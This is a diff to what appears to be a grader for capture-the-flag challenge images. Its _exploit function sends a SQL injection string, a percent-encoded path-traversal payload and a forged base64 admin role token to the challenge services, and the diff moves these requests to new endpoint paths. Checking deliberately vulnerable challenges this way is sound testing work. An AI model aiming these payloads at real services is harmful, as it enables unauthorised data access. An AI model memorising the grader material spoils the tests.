@@ -71,7 +71,7 @@ def _exploit(base: str, spec: dict) -> str:
         for _ in range(level): token = base64.b64encode(token)
         return _http(base + "/admin", "role=" + token.decode())
     if kind == "query-injection":
-        body = _http(base + "/?name=" + urllib.parse.quote("' OR kind='flag' -- "))
+        body = _http(base + "/search?name=" + urllib.parse.quote("' OR kind='flag' -- "))
         data = body.strip().encode()
         for _ in range(level - 1): data = base64.b64decode(data)
         return data.decode(errors="replace")
@@ -85,15 +85,15 @@ def _exploit(base: str, spec: dict) -> str:
             # quote() deliberately leaves dots unescaped, while this challenge
             # needs every traversal character hidden during the first check.
             payload = "".join(f"%{byte:02X}" for byte in payload.encode())
-        last = _http(base + "/?name=" + payload)
+        last = _http(base + "/file?name=" + payload)
         if "flag{" in last: return last
     return last
 
 
 def _normal(base: str, kind: str) -> bool:
     if kind == "weak-session": return _http(base + "/status").strip() == "guest"
-    if kind == "query-injection": return "manual" in _http(base + "/?name=manual")
-    return "public archive" in _http(base + "/?name=welcome.txt")
+    if kind == "query-injection": return "manual" in _http(base + "/search?name=manual")
+    return "public archive" in _http(base + "/file?name=welcome.txt")
 
 
 def _evaluate_image(tag: str, spec: dict, expected_flag: str) -> tuple[bool, bool]:
